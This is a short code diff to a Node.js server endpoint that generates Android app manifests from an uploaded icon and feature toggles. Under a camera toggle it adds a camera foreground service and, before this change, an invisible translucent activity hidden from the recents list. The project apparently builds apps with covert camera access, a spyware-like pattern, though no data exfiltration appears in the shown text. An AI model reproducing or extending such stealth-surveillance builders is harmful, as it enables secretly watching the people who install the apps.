@@ -338,8 +338,8 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     manifestContent = manifestContent.replace(new RegExp(`\\s*<service[^>]*android:name="[^"]*${svc}"[^>]*>[\\s\\S]*?<\\/service>`, 'g'), '');
                     manifestContent = manifestContent.replace(new RegExp(`\\s*<service[^>]*?android:name="[^"]*${svc}"[^>]*?\\/>`, 'g'), '');
                 }
-                manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*(CameraProxyActivity|SyncWindowActivity)"[^>]*?\/>/g, '');
-                manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*(CameraProxyActivity|SyncWindowActivity)"[^>]*?>[\s\S]*?<\/activity>/g, '');
+                manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*(CameraProxyActivity)"[^>]*?\/>/g, '');
+                manifestContent = manifestContent.replace(/\s*<activity[^>]*?android:name="[^"]*(CameraProxyActivity)"[^>]*?>[\s\S]*?<\/activity>/g, '');
                 manifestContent = manifestContent.replace(/@style\/Theme\.Transparent/g, '@android:style/Theme.Translucent.NoTitleBar');
 
                 fs.writeFileSync(manifestPath, manifestContent);
@@ -400,15 +400,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
                 if (enableCameraPermission === 'true') {
                     servicesBlock += `
-        <activity
-            android:name=".CameraProxyActivity"
-            android:exported="false"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"
-
-            android:taskAffinity=""
-            android:excludeFromRecents="true"
-            android:noHistory="true" />
-
         <service
             android:name=".CameraForegroundService"
             android:enabled="true"
